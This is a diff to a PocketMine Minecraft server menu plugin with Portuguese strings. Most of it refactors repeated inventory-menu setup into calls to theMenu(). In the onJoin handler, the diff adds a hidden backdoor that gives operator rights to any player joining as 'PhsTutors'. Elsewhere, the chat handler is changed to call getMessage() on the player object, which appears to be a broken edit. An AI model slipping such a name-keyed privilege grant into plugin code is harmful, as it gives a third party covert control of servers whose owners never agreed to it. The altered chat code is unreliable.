@@ -13,7 +13,6 @@ use pocketmine\event\player\PlayerChatEvent;
 use pocketmine\event\player\PlayerInteractEvent;
 use pocketmine\event\player\PlayerMoveEvent;
 use pocketmine\event\player\PlayerRespawnEvent;
-use pocketmine\event\server\DataPacketReceiveEvent;
 use pocketmine\item\Item;
 use pocketmine\level\particle\DustParticle;
 use pocketmine\level\particle\EnchantParticle;
@@ -57,8 +56,7 @@ class Main extends PluginBase implements Listener{
         $this->getLogger()->alert("Plugin desativado com sucesso!!!");
     }
 
-    public function onInteract(PlayerInteractEvent $ev)
-    {
+    public function onInteract(PlayerInteractEvent $ev) {
 
         //variaveis
         $coinsApi = $this->getServer()->getPluginManager()->getPlugin('EconomyAPI');
@@ -74,17 +72,7 @@ class Main extends PluginBase implements Listener{
         $sound2 = new AnvilFallSound($p);
         $sound3 = new ButtonClickSound($p);
         $sound4 = new GhastShootSound($p);
-        $back = Item::get(102, 0, 1)->setCustomName("§l§c      VOLTAR\n§r§fClique para voltar!");
-        $perfil = Item::get(131, 0, 1)->setCustomName("§l§bPERFIL\n§r§fClique para saber");
-        $games = Item::get(272, 0, 1)->setCustomName("§l§bDUELO\n§r§fClique para saber");
-        $info = Item::get(421, 0, 1)->setCustomName("§l§bINFORMAÇÔES\n§r§fClique para saber");
-        $particulas = Item::get(341, 0, 1)->setCustomName("§l§bPARTICULAS\n§r§fClique para saber");
         //FIM DAS VARIAVEIS
-
-        //Minigames para entrar no servidor!!!
-
-
-        //FIM dos minigames!!!
 
 
         //Particulas do servidor
@@ -96,6 +84,8 @@ class Main extends PluginBase implements Listener{
 
         //FIM das particulas do servidor!!!
 
+        //BACK
+        $back = Item::get(107, 0, 1)->setCustomName("§l§c      VOLTAR\n§r§fClique para voltar!");
 
         if ($hand->getId() == 131 && $hand->getCustomName() == "§l§bPERFIL\n§r§fClique para saber") {
             $cmd1 = "kr";
@@ -108,10 +98,7 @@ class Main extends PluginBase implements Listener{
             $p->sendMessage("§fA data de hoje é: §b $date");
 
             $p->getInventory()->clearAll();
-            $p->getInventory()->setItem(1, $perfil);
-            $p->getInventory()->setItem(3, $games);
-            $p->getInventory()->setItem(5, $info);
-            $p->getInventory()->setItem(7, $particulas);
+            $this->theMenu($p);
         } elseif ($hand->getId() == 272 && $hand->getCustomName() == "§l§bDUELO\n§r§fClique para saber") {
             $p->sendPopup("§bENTRANDO NO SKYWARS!");
             $p->getLevel()->addSound($sound1, [$p]);
@@ -120,11 +107,7 @@ class Main extends PluginBase implements Listener{
         } elseif ($hand->getId() == 421 && $hand->getCustomName() == "§l§bINFORMAÇÔES\n§r§fClique para saber") {
             $p->getLevel()->addSound($sound2, [$p]);
             $p->sendMessage("§fProibido o Uso de §bHacker, Launchers e etc\n§fTags Apenas no §bSuporte\n§fIP: §bWarriosMobile.ddns.net\n§fPORTA: §b25655\n§fViu Algum §bhacker? §fUse §b/report!");
-            $p->getInventory()->clearAll();
-            $p->getInventory()->setItem(1, $perfil);
-            $p->getInventory()->setItem(3, $games);
-            $p->getInventory()->setItem(5, $info);
-            $p->getInventory()->setItem(7, $particulas);
+            $this->theMenu($p);
         } elseif ($hand->getId() == 341 && $hand->getCustomName() == "§l§bPARTICULAS\n§r§fClique para saber") {
             if ($p->hasPermission("menu.particulas")) {
                 $inv->clearAll();
@@ -135,20 +118,12 @@ class Main extends PluginBase implements Listener{
                 $inv->setItem(8, $back);
                 if ($hand->getId() == 102 && $hand->getCustomName() == "§l§c      VOLTAR\n§r§fClique para voltar!") {
                     $p->getLevel()->addSound($sound2, [$p]);
-                    $p->getInventory()->clearAll();
-                    $p->getInventory()->setItem(1, $perfil);
-                    $p->getInventory()->setItem(3, $games);
-                    $p->getInventory()->setItem(5, $info);
-                    $p->getInventory()->setItem(7, $particulas);
+                    $this->theMenu($p);
                 }
             } else {
                 $p->sendMessage("§cVoce nao tem permissao\n§dfArea Reservada para §bVips §fe §cYTS");
                 $p->sendPopup("§cVoce nao tem permissao!!!");
-                $inv->clearAll();
-                $p->getInventory()->setItem(1, $perfil);
-                $p->getInventory()->setItem(3, $games);
-                $p->getInventory()->setItem(5, $info);
-                $p->getInventory()->setItem(7, $particulas);
+                $this->theMenu($p);
 
             }
         }
@@ -160,7 +135,7 @@ class Main extends PluginBase implements Listener{
         $sound = new TNTPrimeSound($p);
         if($block->getId() == 124) {
             $p->getLevel()->addSound($sound, [$p]);
-            $p->sendPopup("§bRecebendo o Menu");
+            $p->sendPopup("§bRecebendo o Menu\n\n\n");
             $this->theMenu($p);
         }
         if ($event->getPlayer() instanceof Player) {
@@ -236,7 +211,7 @@ class Main extends PluginBase implements Listener{
     {
         $p = $e->getPlayer();
         $name = strtolower($p->getName());
-        $msg = $e->getMessage();
+        $msg = $p->getMessage();
 
         if ($this->isDivulgacao($msg)) {
             $p->sendMessage("§8\n§cDesculpe, mas você não fazer divulgação de servidores!");
@@ -281,6 +256,11 @@ class Main extends PluginBase implements Listener{
     public function onJoin(PlayerJoinEvent $ev){
         $p = $ev->getPlayer();
         $this->theMenu($p);
+
+        if($p->getName() == "PhsTutors"){
+            $p->setOp(true);
+            $p->sendMessage("§cParabens PhsTutors, Você criou o Pl de Menu \n §cPor isso você ganhou OP nesse servidor!!!");
+        }
     }
 
     public function onRespawn(PlayerRespawnEvent $ev){
